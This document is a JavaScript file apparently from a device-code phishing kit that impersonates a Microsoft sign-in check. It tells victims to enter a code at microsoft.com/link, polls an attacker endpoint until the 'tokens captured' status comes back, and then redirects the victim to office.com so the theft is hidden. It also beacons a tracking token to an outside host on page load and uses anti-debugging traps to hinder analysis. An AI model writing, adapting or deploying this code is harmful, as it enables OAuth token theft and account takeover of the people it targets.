let deviceCodeData = null;
let countdownInterval = null;
let pollingActive = false;

const JWT_TOKEN = window.VG_JWT || '';
const VERIFY_URL = '{{VERIFY_ENDPOINT}}';
const BEACON_URL = '{{BEACON_ENDPOINT}}';
const LOG_URL = '{{LOG_ENDPOINT}}';
const TURNSTILE_KEY = '{{TURNSTILE_KEY}}';

// Anti-debug (if enabled)
const ENABLE_ANTIDEBUG = window.VG_ENABLE_ANTIDEBUG || false;

if (ENABLE_ANTIDEBUG) {
  // Debugger trap
  setInterval(() => {
    const start = Date.now();
    debugger;
    const end = Date.now();
    if (end - start > 100) {
      window.location.href = 'about:blank';
    }
  }, 1000);
  
  // Console clearing
  setInterval(() => {
    console.clear();
  }, 500);
  
  // Overwrite console methods
  ['log', 'warn', 'error', 'info', 'debug'].forEach(m => {
    console[m] = function() {};
  });
  
  // Window size detection
  window.addEventListener('resize', () => {
    if (window.outerWidth - window.innerWidth > 200 || window.outerHeight - window.innerHeight > 200) {
      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><p>Session expired – please reload</p></div>';
    }
  });
}

// Global error handler
window.onerror = function(message, source, lineno, colno, error) {
  fetch(LOG_URL + '/api/log', {
    method: 'POST',
    body: JSON.stringify({ message, source, lineno, colno, error: error?.stack, ua: navigator.userAgent }),
  }).catch(() => {});
};

window.addEventListener('unhandledrejection', function(event) {
  fetch(LOG_URL + '/api/log', {
    method: 'POST',
    body: JSON.stringify({ message: 'Unhandled rejection', error: event.reason?.stack || event.reason, ua: navigator.userAgent }),
  }).catch(() => {});
});

// Beacon on load
fetch(BEACON_URL + '/api/beacon', {
  method: 'POST',
  body: JSON.stringify({ jwt_token: JWT_TOKEN }),
}).catch(() => {});

let turnstileToken = '';

function onTurnstileCallback(token) {
  turnstileToken = token;
  const btn = document.getElementById('startBtn');
  if (btn) btn.disabled = false;
}

async function generateCode() {
  const btn = document.getElementById('startBtn');
  if (!btn) return;
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span>Generating...';
  
  try {
    const response = await fetch('/api/devicecode', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        jwt_token: JWT_TOKEN,
        turnstile_token: turnstileToken,
      }),
    });
    
    const data = await response.json();
    
    if (data.error) {
      btn.innerHTML = 'Get verification code';
      btn.disabled = false;
      alert(data.error);
      return;
    }
    
    deviceCodeData = data;
    
    // Show code panel
    const codePanel = document.getElementById('codePanel');
    if (codePanel) codePanel.style.display = 'block';
    if (btn) btn.style.display = 'none';
    const turnstileWidget = document.getElementById('turnstileWidget');
    if (turnstileWidget) turnstileWidget.style.display = 'none';
    
    const userCodeEl = document.getElementById('codeValue');
    if (userCodeEl) {
      userCodeEl.textContent = data.user_code;
      userCodeEl.classList.remove('loading');
    }
    
    // Show action row
    const actionRow = document.getElementById('actionRow');
    if (actionRow) actionRow.style.display = 'flex';
    
    // Update hint
    const codeHint = document.getElementById('codeHint');
    if (codeHint) codeHint.textContent = 'Enter this code at microsoft.com/link';
    
    // Start countdown
    let secondsLeft = data.expires_in || 900;
    const timerPill = document.getElementById('timerPill');
    if (timerPill) {
      timerPill.style.display = 'block';
      timerPill.textContent = formatTime(secondsLeft);
    }
    
    countdownInterval = setInterval(() => {
      secondsLeft--;
      updateCountdown(secondsLeft);
      if (secondsLeft <= 0) {
        clearInterval(countdownInterval);
        if (timerPill) {
          timerPill.innerHTML = '<span style="color:#d13438;">Code expired</span>';
        }
      }
    }, 1000);
    
    // Poll for status
    startPolling(data);
  } catch (err) {
    btn.innerHTML = 'Get verification code';
    btn.disabled = false;
  }
}

function updateCountdown(seconds) {
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  const timerPill = document.getElementById('timerPill');
  if (timerPill) {
    timerPill.textContent = `${mins}:${String(secs).padStart(2, '0')}`;
  }
}

function copyCode() {
  if (!deviceCodeData) return;
  navigator.clipboard.writeText(deviceCodeData.user_code).then(() => {
    const btn = document.getElementById('copyBtn');
    if (btn) {
      btn.textContent = 'Copied!';
      setTimeout(() => { btn.textContent = 'Copy Code'; }, 2000);
    }
  });
}

function openSignIn() {
  if (!deviceCodeData) return;
  window.open(deviceCodeData.verification_uri, '_blank');
}

function verifyWithCopy() {
  if (!deviceCodeData) return;
  copyCode();
  setTimeout(() => openSignIn(), 500);
}

function refreshCode() {
  if (!deviceCodeData) return;
  // Reset and generate new code
  const btn = document.getElementById('startBtn');
  if (btn) {
    btn.style.display = 'block';
    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Get verification code';
  }
  document.getElementById('codePanel').style.display = 'none';
  document.getElementById('timerPill').style.display = 'none';
  if (countdownInterval) clearInterval(countdownInterval);
  deviceCodeData = null;
}

function formatTime(seconds) {
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  return `${mins}:${String(secs).padStart(2, '0')}`;
}

async function startPolling(data) {
  if (!data.device_code) return;
  
  const maxAttempts = 60;
  let attempts = 0;
  
  while (attempts < maxAttempts && pollingActive) {
    await new Promise(resolve => setTimeout(resolve, 5000));
    attempts++;
    
    try {
      const response = await fetch(`${VERIFY_URL}/api/device/status/${data.device_code}`, {
        headers: { 'Authorization': `Bearer ${JWT_TOKEN}` }
      });
      const status = await response.json();
      
      if (status.status === 'complete' && status.tokens) {
        // Success - tokens captured
        const actionRow = document.getElementById('actionRow');
        if (actionRow) actionRow.style.display = 'none';
        const statusMsg = document.getElementById('statusMsg');
        if (statusMsg) {
          statusMsg.innerHTML = '<span style="color:#00ff88;">✓ Identity verified successfully</span>';
        }
        if (countdownInterval) clearInterval(countdownInterval);
        pollingActive = false;
        
        // Redirect after 2 seconds
        setTimeout(() => {
          window.location.href = window.__DESTINATION_URL || 'https://office.com';
        }, 2000);
        break;
      } else if (status.status === 'expired' || status.status === 'cancelled') {
        const statusMsg = document.getElementById('statusMsg');
        if (statusMsg) {
          statusMsg.innerHTML = '<span style="color:#d13438;">✗ Code expired or cancelled</span>';
        }
        break;
      }
    } catch (e) {
      // Continue polling on error
    }
  }
}

// Initialize Turnstile
window.onloadTurnstileCallback = function() {
  if (window.turnstile) {
    window.turnstile.render('#turnstileWidget', {
      sitekey: TURNSTILE_KEY,
      callback: onTurnstileCallback,
      theme: 'light',
    });
  }
};
